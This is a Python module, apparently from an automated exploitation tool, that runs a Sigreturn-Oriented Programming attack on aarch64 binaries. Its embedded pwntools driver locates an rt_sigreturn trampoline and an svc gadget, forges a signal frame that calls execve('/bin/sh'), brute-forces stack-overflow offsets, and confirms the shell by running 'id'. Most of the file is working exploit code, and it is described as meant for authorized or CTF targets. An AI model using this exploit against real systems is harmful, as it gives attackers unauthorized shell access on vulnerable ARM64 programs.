"""SROP on aarch64 (ARM64), verified by execution WHERE an aarch64 runtime exists.

Sigreturn-Oriented Programming on ARM64: a stack overflow overwrites the saved frame record so the
epilogue `ret`s into a `mov x8, #139; svc #0` trampoline (rt_sigreturn = 139), which restores a
forged sigcontext from the stack. That frame sets x8 = 221 (execve), x0 = &"/bin/sh", x1 = x2 = 0 and
pc = a `svc #0` gadget, so the kernel runs execve("/bin/sh", 0, 0). pwntools builds the frame
(`SigreturnFrame(kernel="aarch64")`).

GROUNDING NOTE: binoracle verifies by executing the target and reading back a shell. That requires an
aarch64 runtime -- an ARM64 host, or qemu-user (`qemu-aarch64`) with an aarch64 loader. On an x86-64
box with no emulation the target cannot be launched, so this degrades HONESTLY to `not_verified`
(it never claims a shell it did not get). It is NOT applicable to non-aarch64 binaries. For
AUTHORIZED / CTF targets."""
from __future__ import annotations

from ._sandbox import run_driver

_DRIVER = r'''
import sys, time
from pwn import ELF, context, SigreturnFrame, process
name = sys.argv[1]
elf = ELF(name, checksec=False)
if elf.arch != "aarch64":
    print("NOT_APPLICABLE (srop_aarch64 driver needs an aarch64 ELF)"); sys.exit(1)
context.binary = elf; context.log_level = "error"

sym = elf.symbols or {}
tramp = sym.get("srop_tramp")            # mov x8,#139; svc #0  (rt_sigreturn)
svc = sym.get("svc_gadget")              # svc #0               (execve)
binsh = sym.get("binsh")
if binsh is None:
    try: binsh = next(elf.search(b"/bin/sh\x00"))
    except StopIteration: binsh = None
if tramp is None or svc is None or binsh is None:
    print("NOT_APPLICABLE (no aarch64 SROP shape: need srop_tramp + svc_gadget + /bin/sh)"); sys.exit(1)

MARK = b"BINORACLE_SROPARM_PWNED"
NR_execve = 221

def build_frame(sp):
    f = SigreturnFrame(kernel="aarch64")
    f.x8 = NR_execve
    f.x0 = binsh
    f.x1 = 0
    f.x2 = 0
    f.pc = svc
    f.sp = sp
    return bytes(f)

# The saved frame record (x29,x30) sits at a fixed offset above buf; the epilogue pops it and `ret`s
# into x30. Put `tramp` in x30 and the sigframe right after it. Sweep the common offsets; sp in the
# frame points back into our controlled buffer region so the restored stack stays valid.
ok = False
for off in (72, 80, 88, 64, 96, 104, 112, 120, 128, 144, 160):
    io = None
    try:
        io = process([name])
        try: io.recvrepeat(0.2)
        except Exception: pass
        sframe = build_frame(0)                 # sp value is not critical for execve; keep 0
        payload = b"A" * off + (tramp).to_bytes(8, "little") + sframe
        io.send(payload); time.sleep(0.25)
        io.sendline(b"echo " + MARK + b"; id"); time.sleep(0.4)
        out = b""
        try: out = io.recvrepeat(1.2)
        except Exception: pass
        io.close()
        if MARK in out or b"uid=" in out:
            print("VERIFIED off=%d tramp=%#x svc=%#x binsh=%#x" % (off, tramp, svc, binsh))
            sys.exit(0)
    except Exception:
        try:
            if io: io.close()
        except Exception: pass
print("NOT_VERIFIED")
sys.exit(1)
'''


def autosrop_aarch64(binary: str) -> dict:
    """SROP aarch64 verificado por ejecucion DONDE hay runtime aarch64 (host ARM64 o qemu-aarch64).
    En un x86-64 sin emulacion degrada honestamente a no-verificado: no afirma shell que no obtuvo.
    No aplica a binarios no-aarch64."""
    res = run_driver(binary, _DRIVER, ".binoracle_sroparm.py")
    if not res.get("ok"):
        return res
    eng = res.get("engine", "sandbox")
    out = (res.get("output") or "")
    if "NOT_APPLICABLE" in out:
        res["note"] = "SROP aarch64: no aplica (el binario no es aarch64)"
    elif res.get("verified"):
        res["note"] = f"SROP aarch64: rt_sigreturn restaura el frame forjado -> execve('/bin/sh'), shell verificada por ejecucion ({eng})"
    else:
        res["note"] = (f"SROP aarch64: no verificado ({eng}) -- requiere runtime aarch64 "
                       "(host ARM64 o qemu-aarch64); construido pero no ejecutable aqui")
    return res


def render_srop_aarch64(r: dict) -> str:
    out = ["## Auto SROP aarch64 (sigreturn -> execve, verificado donde hay runtime ARM64)\n"]
    if not r.get("ok"):
        return "\n".join(out + ["No disponible: " + r.get("note", "")])
    out.append(f"- shell verificada en sandbox: **{'SI' if r.get('verified') else 'no'}**")
    if r.get("detail"):
        out.append(f"- `{r['detail']}`")
    out.append("- " + r.get("note", ""))
    out.append("\n_nota: aarch64 usa rt_sigreturn=139 y execve=221; la verificacion por ejecucion "
               "exige un runtime aarch64 (host ARM64 o qemu-aarch64). En x86-64 sin emulacion degrada "
               "honestamente: nunca afirma una shell no obtenida._")
    if r.get("output"):
        out.append("\n### salida\n```\n" + r["output"].strip() + "\n```")
    return "\n".join(out)
